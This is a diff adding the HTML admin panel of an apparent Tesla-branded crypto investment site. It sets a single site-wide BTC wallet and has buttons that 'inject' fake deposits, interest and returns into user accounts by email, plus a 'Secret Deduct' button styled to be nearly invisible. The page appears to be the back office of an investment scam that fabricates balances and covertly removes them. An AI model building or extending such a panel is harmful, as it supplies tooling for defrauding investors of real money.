@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Tesla Base | Admin</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body style="padding: 30px; background: #050505;">
+    <h1>Tesla Base - MASTER ADMIN</h1>
+    
+    <div class="admin-panel">
+        <h3>User Monitoring</h3>
+        <div id="user-list">
+            </div>
+
+        <hr>
+
+        <h3>Global Settings</h3>
+        <input type="text" id="admin-btc-wallet" placeholder="System BTC Wallet Address">
+        <button onclick="updateGlobalWallet()">Update Wallet</button>
+
+        <hr>
+
+        <h3>Manual Actions (Inject/Deduct)</h3>
+        <input type="text" id="target-user" placeholder="User Email">
+        <input type="number" id="inject-amount" placeholder="Amount">
+        <button onclick="adminAction('deposit')">Inject Deposit</button>
+        <button onclick="adminAction('interest')">Inject Interest</button>
+        <button onclick="adminAction('return')">Inject Inv. Return</button>
+        <button onclick="adminAction('deduct')" style="background:none; border:none; color:#111;">Secret Deduct</button>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="app.js"></script>
+</body>
+</html>
